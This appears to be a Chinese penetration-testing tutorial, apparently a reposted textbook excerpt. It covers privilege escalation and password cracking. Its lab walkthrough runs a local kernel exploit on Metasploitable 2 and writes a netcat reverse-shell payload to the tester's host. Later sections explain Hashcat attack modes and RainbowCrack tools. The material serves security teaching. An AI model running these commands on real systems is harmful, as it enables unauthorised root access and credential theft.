所以在利用[漏洞](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127021&idx=3&sn=451c93a621ba2ced4a5ca0e1e63f43c1&chksm=bc8598028bf21114cebd8e7f27e0cf15b764fdef35358d8c62edc03d681d72382568fbadb991&scene=21#wechat_redirect)之后就应当提升权限。提升权限的实质是通过利用[漏洞](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127021&idx=3&sn=451c93a621ba2ced4a5ca0e1e63f43c1&chksm=bc8598028bf21114cebd8e7f27e0cf15b764fdef35358d8c62edc03d681d72382568fbadb991&scene=21#wechat_redirect)的手段提高自身的操作权限。

  

提升权限的方式分为两类。

  

（1）纵向[提权](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655121595&idx=2&sn=fa5378d9f618ea02be4de0e9ddc42612&chksm=bc866d548bf1e442ea97439b3d4d527d03c0cd730575eb10a54fe972de9e78a857be52188cea&scene=21#wechat_redirect)（vertical privilege escalation）：如果低权限角色（的用户）能够获得高权限角色的权限，则这种提权就可称为纵向提权。例如，如果在提权之后，内容管理系统（CMS）的某个用户能够使用管理员的功能，那么这种提权就是纵向提权。

  

（2）横向[提权](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655116686&idx=3&sn=42eec1a9e9c8317899f0b71e9c4f7674&chksm=bc8640618bf1c97720c19f5989ef8906f2a1c12be4d0a93998228afaa86b5871908a2fac2702&scene=21#wechat_redirect)（horizontal privilege escalation）：如果获取了同级别角色的权限，这种提权就属于横向提权。例如，如果在网上银行里，用户 A 获取了用户 B 的权限，他可以替用户B进行操作，那么这种提权就属于横向提权。

  

越权提升权限的攻击矢量，大体可分为以下几种。

  

● 利用本地[漏洞](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127021&idx=3&sn=451c93a621ba2ced4a5ca0e1e63f43c1&chksm=bc8598028bf21114cebd8e7f27e0cf15b764fdef35358d8c62edc03d681d72382568fbadb991&scene=21#wechat_redirect)。

● 利用目标系统上的配置缺陷。例如，如果 home 目录可被其他用户访问，那么攻击人员就可以使用目录里的SSH私有密钥访问其他主机。

● 利用目标系统的弱[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)。

● 嗅探网络流量以捕获他人的用户名和[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)。

● 伪造网络数据包。

  

**一、利用本地漏洞**

  

我们将使用本地[漏洞](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127021&idx=3&sn=451c93a621ba2ced4a5ca0e1e63f43c1&chksm=bc8598028bf21114cebd8e7f27e0cf15b764fdef35358d8c62edc03d681d72382568fbadb991&scene=21#wechat_redirect)的利用程序（local exploit）提升权限。

  

我们的演示环境如下。

  

● IP 为192.168.56.102，运行Metasploitable 2 的虚拟机充当被测主机。

● IP 为192.168.56.101，运行Kali Linux 的虚拟机充当测试平台。

  

首先，我们要扫描被测主机上的网络服务。通过下述指令进行端口扫描。

  

> nmap –p- 192.168.56.102

  

我们通过-p-选项，令[Nmap](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655114918&idx=1&sn=b70d4598a2f2a3296127d46616c7092a&chksm=bc864b498bf1c25f70dc0dc3bcd0bde64c29757771cc6d884f865d9c4a3b236d40dc6e8bcf32&scene=21#wechat_redirect)扫描被测主机的所有端口（1～65535）。

  

在扫描结束之后，[Nmap](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655114918&idx=1&sn=b70d4598a2f2a3296127d46616c7092a&chksm=bc864b498bf1c25f70dc0dc3bcd0bde64c29757771cc6d884f865d9c4a3b236d40dc6e8bcf32&scene=21#wechat_redirect)会列出所有开放的端口（见图1）。

在进一步操作之前，我们应到获取被测主机的详细信息。现在，我们通过下述指令查看被测主机的内核版本。

  

> uname –r

  

通过上述指令，我们了解到目标主机的内核是2.6.24-16-server。

  

我们搜索 exploit-db 的资料库，发现某个 exploit 程序可将我们的权限提升为root权限。下一步，我们在测试主机上保存exploit程序，然后使被测主机从测试主机下载这个程序。有关指令如图4所示。

在被测主机上下载exploit之后，我们在被测主机上使用gcc指令编译exploit。

  

> gcc privs.c -o privs

  

现在，我们制备好了exploit程序。在分析了exploit的源代码之后，我们发现这个exploit程序需要在命令行里使用 udevd netlink socket 的 PID（Process Identifier）作为参数。为此，我们使用下述指令获取这个PID值。

  

> cat /proc/net/netlink

  

所获信息如图5所示。

上述指令的输出结果如下。

即，udev服务的PID是2390。

  

在实际的[渗透测试](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126295&idx=3&sn=2e4be42cf43c7049381c2a5e3a04fc30&chksm=bc859ef88bf217ee493aa4b45375814e07f7f4c08bdefa3d85ea68c9c5fdc3cd217b97d7191e&scene=21#wechat_redirect)工作之中，您可能要安装一台内核与被测主机完全相同的测试主机，以测试exploit程序。

  

从被测主机上收集的信息判断，目标主机上安装有NetCat程序。成功运行exploit程序之后，我们就有了被测主机的 root 权限。我们再在被测主机上运行 netcat 程序，让它反向连接到测试主机。通过其源代码可知，这个 exploit 把文件名为 run 的可执行文件当作其payload。所以，我们需要制备这个payload。

  

> echo '#!/bin/bash' > run
> 
> echo '/bin/netcat -e /bin/bash 192.168.56.101 31337' >> run

  

在执行payload之前，我们还要在测试主机上启动netcat的监听服务，以受理被测主机发起的连接。

  

> nc -vv -l -p 31337

  

最后，我们在被测主机上运行下述指令。

  

> ./privs 2390

  

此后，我们可在测试主机上看到图6所示的信息。

![](../Images/6eb4f5fc0cebbc819b375cf40c0dde94.png)

图6

通过whoami指令，我们可看到已经成功提升自身权限为root的权限。

  

**二、密码攻击**

  

[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)是当代系统验证用户身份的主要手段。只要某人能够递交正确的用户名和对应的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)，系统就允许这个人登录并允许他使用该账号的所有资源。

  

构成身份验证的要素可分为三大类。

  

● 基于所知（something you know）。这类认证要素通常被称为身份验证的第一要素。[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)就属于这类要素。理论上来说，只有特定秘密的持有人才能“知道”有关秘密。然而不幸的是，这类信息很容易外泄，也易于被他人获悉。因此，机要系统应当采取其他方式的身份验证方式。

  

● 基于所有（somethingyou have）。这类认证要素通常被称为身份验证的第二要素。安全令牌、门禁卡等都属于这类认证要素。向系统出示相应的安全持有物后，持有者即可获得登录权。不过，持有物（信息）可被复制，所以这种身份验证方法并非没有缺陷。

  

● 基于特征（something you are）。这类认证要素通常被称为身份验证的第三要素。相比前两者而言，这类信息的身份验证方法更为安全。然而，已经出现了攻击这种验证方法的实际案例。指纹识别和视网膜识别都属于验证这类要素的手段。

  

如果有较高的安全需求，就应当验证一个以上的验证要素。高规格的安全系统往往验证第一要素和第二要素。因为这种方法验证了两种身份验证要素，因此被称为双要素验证。

然而不幸的是，我们的经验表明，目前多数系统广泛依赖单一的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)验证。作为[渗透测试](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126667&idx=2&sn=2266aac5a00f1c5ed1c66545c638fc68&chksm=bc8599648bf21072037eb0fb9e553287dcd6f77621111016fdfb615f12be41c6332e57eb0b86&scene=21#wechat_redirect)人员，您应当在测试过程中验证[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)的安全性。

  

根据攻击方式的不同，[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)攻击可分为以下几类。

  

● 离线攻击：这种攻击手段意在获取目标主机上的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect) hash 文件，并将该文件复制到攻击人员的主机。此后，攻击人员就可使用[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)破解工具破解[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)文件。这种方法的优点是无须顾及被测主机上的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)阻止策略（账户锁定等设置），因为有关破解工作是在攻击人员的主机上完成的。

  

● 在线攻击：如果采用这种方法，攻击人员将猜测用户名和对应的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)。因为需要多次猜测用户[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)，所以这种方式因为可能会触发账户锁定等保护机制。

  

**1、离线攻击工具**

  

这类工具用于实施离线[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)攻击。通常情况下，您会用这种工具破解高权限账户的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)，所以这些工具往往用于纵向[提权](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655120330&idx=2&sn=057c21d95055e79a45a17d6745d93d19&chksm=bc8676258bf1ff33be48e1115fcd9d2b1865c274aa4ef0bd05e01fb3ec8493d1a8931edc4ee7&scene=21#wechat_redirect)。

  

既然已经有了某种权限的账户信息，为什么还需要其他账户的登录信息呢？在对某个系统进行[渗透测试](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127440&idx=2&sn=c223aa7241748e66d4ec2490bbe3018e&chksm=bc859a7f8bf213690ae817fe10cf9b5e3a794f74c7650f5fb229284933de86f2f735d6b0bc2c&scene=21#wechat_redirect)时，受被测主机配置的影响，所用账户可能无法运行某些特定的应用程序。这种情况下，您就无法进行下一步测试。但是，如果使用常规用户身份登录，您就可以正常运行那些程序了。这是需要获取其他账户信息的原因之一。

  

现在的主流系统在存储[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)的时候都只保存[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)的hash（哈希值）。通过哈希[算法](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127399&idx=3&sn=2da4a905122ffc029304547824648817&chksm=bc859a888bf2139e6cd43ee57e6e1c09f8f128c24d31df1a27f576a1eb89b2e0a518ecab1976&scene=21#wechat_redirect)，[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)可被转换为固定长度的消息摘要。这种转换是不可逆的单向转换。所谓单向转换是指：这种[算法](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127399&idx=3&sn=2da4a905122ffc029304547824648817&chksm=bc859a888bf2139e6cd43ee57e6e1c09f8f128c24d31df1a27f576a1eb89b2e0a518ecab1976&scene=21#wechat_redirect)可将既定原始值轻松地转换为某个哈希，而没有实用的方法可以从哈希值[逆向](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126321&idx=3&sn=67729f13740b44858c4eb03f8b43fa47&chksm=bc859ede8bf217c8ecd2086c433e118e518b0caeb5a3a91e5a1380370f185c5049c56d76afc8&scene=21#wechat_redirect)推导出原始的输入值。

  

过去，计算机系统保存[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)明文。如果攻击人员获取到[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)文件，那么他就获取了全部的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)。现在，即使攻击人员获取了[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)文件，他们也只能获取[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)的哈希值，还是无法轻易获取原始[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)。

  

[密码破解](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117794&idx=3&sn=beacc776e9269f6df4b5e6e223675d36&chksm=bc867c0d8bf1f51b2342ae032b16a870abadf4469927b93d25b838b1408fb14a76db0ff06ad0&scene=21#wechat_redirect)是以穷举的方式做哈希碰撞。如果所测[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)的哈希值与文件中的哈希值相符，就意味着猜测到了正确的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)。

  

在利用[SQL注入](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126385&idx=3&sn=b23726df648ff0b81ca7aa5f6a45b1fb&chksm=bc859e9e8bf2178862780bd30880117217bb5aa4d863712fafaa87ff64331929b26b032c35d0&scene=21#wechat_redirect)[漏洞](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127021&idx=3&sn=451c93a621ba2ced4a5ca0e1e63f43c1&chksm=bc8598028bf21114cebd8e7f27e0cf15b764fdef35358d8c62edc03d681d72382568fbadb991&scene=21#wechat_redirect)之后，测试人员就可导出整个数据库，继而可找到[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)的哈希值。离线破解工具可以帮助测试人员从哈希值中获取记录的原始信息。

  

在一次[渗透测试](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127474&idx=2&sn=b83601221b6abc046fd16bf484c02a6b&chksm=bc859a5d8bf2134b2c7511d0e9094a757ce53f9904d69a4851042e6577d1f07a40d9dafd4a8f&scene=21#wechat_redirect)项目里，我们导出了整个数据库。这个数据里存有整个E-mail系统的用户名和[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)。借助这些信息，我们以某个关键人物的身份登录到了E-mail系统，并获取了各种机要系统的账户信息。

（2）Hashcat

  

Hashcat是一款免费的多线程[密码破解](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655118266&idx=1&sn=88de005731740043ef114ddf2a452985&chksm=bc867e558bf1f74371eae34a13fa893dc7753136395180f558d55900331e373fc053a0d2d390&scene=21#wechat_redirect)工具。目前，它可破解80种[算法](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655127399&idx=3&sn=2da4a905122ffc029304547824648817&chksm=bc859a888bf2139e6cd43ee57e6e1c09f8f128c24d31df1a27f576a1eb89b2e0a518ecab1976&scene=21#wechat_redirect)的哈希值。Hashcat 程序完全依赖 CPU 运算，它要比利用GPU（Graphical Processing Unit）运算的[密码破解](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655116968&idx=1&sn=8c0959d25f4b97c4034f9a242dc3108f&chksm=bc8643478bf1ca5115da78402a06a462f5a01f962ae66f5b610961344444953f8e5557f0d2ec&scene=21#wechat_redirect)程序要慢一些。

  

Hastcat支持6种攻击模式。

  

● Straight：程序会从文本文件里逐行读取数据，并把这些数据当作[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)的备选值。这是默认的攻击模式，通常也被称作字典式攻击模式。

  

● Combination（组合模式）：Hashcat 将会把字典中的单词进行排列组合，再做哈希碰撞。例如，如果字典中含有以下单词：

  

○ password

○ 01

  

那么Hashcat将会尝试的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)将是：

  

○ passwordpassword

○ password01

○ 01password

○ 0101

  

● Toggle Case（穷举大小写组合）：程序将会尝试每个字典单词的各种大小写组合。

  

● Brute force（暴力破解）：程序将会从关键字空间中取样再做排列组合。这种攻击模式正在被 mask attack 所取代。例如，如果我们设定程序测试 A-Z 组成的双字符[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)，那么Hashcat将会尝试AA到ZZ的所有英文字符组合。

  

● Permutation（排列组合）：对于字典里每个备选[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)，程序将会按照字符进行各种排列组合。例如，如果字典里有AB这个备选[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)，那么Hashcat将会测试的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)如下：

  

○ AB

○ BA

  

● Table-lookup（表查询）：程序将把字典里每个备选[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)的每个字符都当作对应的mask进行处理。这是一种自动匹配模式的穷举攻击。

Hashcat系列有很多[密码破解](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655117898&idx=3&sn=5912df226c08d392db69963d4faf1b16&chksm=bc867fa58bf1f6b3caac8a6a26efa85dcfa33c2eff0cade9b5ec60284bc90842eb46245ee7a6&scene=21#wechat_redirect)工具。其中部分程序可以使用GPU[破解密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655115847&idx=2&sn=4a86823bbd263fa33b1c574b1f006423&chksm=bc8647a88bf1cebef8a058f96b462a7c923a75b7698d309e6205d67cbb3b84b497eff5591e68&scene=21#wechat_redirect)；所以只要您的电脑装有兼容的GPU，那么破解速度还是相当理想的。请注意，无法在VM虚拟机里使用基于GPU破解的程序，因为在虚拟机里运行的程序无法直接调用物理主机的硬件。此外，显卡的兼容性也很重要。要使用基于GPU运算的破解程序，您的显卡需要支持CUDA（NVidia）或OpenCL（AMD）技术。在Hashcat系列里，支持基于GPU运算的破解程序有下面几个。

  

● oclhashcat-lite：它是一款基于GPU 运算的[密码破解](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655115737&idx=1&sn=a6bfb01ca41e767451bfdf98304e0d9e&chksm=bc8644368bf1cd20f17960859be207314a26fc618dca3962143b5998e35a070c72b9b3deb4ed&scene=21#wechat_redirect)程序。在Hashcat 系列工具里，它算得上是速度最快的破解工具。不过它支持的哈希算法有限（约30种），而且只支持markov、brute force 和mask 模式的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)攻击。

  

● oclhashcat-plus：它是一款基于 GPU 运算的[密码破解](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655115847&idx=2&sn=4a86823bbd263fa33b1c574b1f006423&chksm=bc8647a88bf1cebef8a058f96b462a7c923a75b7698d309e6205d67cbb3b84b497eff5591e68&scene=21#wechat_redirect)程序，支持多数哈希算法。这个程序针对字典式攻击进行了各种优化，可同时破解多个哈希值。oclhashcat-plus 工具支持的攻击模式有brute foce（以mask attack 模式实现）、combinator attack、dictionary attack、hybrid attack、mask attack和基于规则的攻击。

  

（3）RainbowCrack

  

彩虹表破解（RainbowCrack）是利用彩虹表来破解哈希数据的工具。它实现了由Philippe Oechslin提倡的“以空间换时间”的技术思想。

  

这种[破解密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655118266&idx=1&sn=88de005731740043ef114ddf2a452985&chksm=bc867e558bf1f74371eae34a13fa893dc7753136395180f558d55900331e373fc053a0d2d390&scene=21#wechat_redirect)的方式有别于暴力破解。暴力破解攻击首先计算[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)的备选值（字典里的[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)）的哈希值，然后再将计算出来的哈希值与获取到的哈希值进行对比。如果这两个值相等，则可确定哈希值的原始内容即是[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)；否则就说明[密码](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655126686&idx=3&sn=c588c739341ee07b2b1d6a84c5e1a6ec&chksm=bc8599718bf210670bfe501723741133e318ca7abcc697f1d1fd5236a9490f3bd6b555342dd9&scene=21#wechat_redirect)不正确。

  

彩虹表破解法的效率也高于暴力破解法。这是因为暴力破解法必须计算字典内容的哈希值，然后进行匹配。而使用“以空间换时间”技术的彩虹表破解法，事先就计算好了字典各项的哈希值，破解过程只是简单的数值比较，所以效率更高。

  

RainbowCrack程序速度不快，而且不支持多线程。人们已经修改了这个程序，使之支持多线程技术和部分显卡采用的 CUDA 技术。

  

[Kali Linux](http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655118312&idx=1&sn=15a5ce1cda46a23544ef63fac26df032&chksm=bc867e078bf1f71108a1ee28fc7ed7ffd299589427dd3dd166d3b32fe2461eb445e64f0d5590&scene=21#wechat_redirect) 收录了RainbowCrack的三大工具。在破解哈希时，您必须依次使用这些工具。

  

● rtgen：生成彩虹表的程序。生成彩虹表的计算过程也被称为彩虹表的预计算阶段。彩虹表包含字典、哈希值、哈希算法、字符集以及字典的长度范围。彩虹表的预计算相当费时。但是生成彩虹表之后，彩虹表破解法将比暴力破解法的效率要高上不少。rtgen 程序支持的算法有 LanMan、NTLM、MD2、MD4、MD5、SHA1 以及RIPEMD160。

  

● rtsort：对rtgen 生成的彩虹表进行排序的工具。

  

● rcrack：利用彩虹表査找哈希值的工具。

（5）John

  

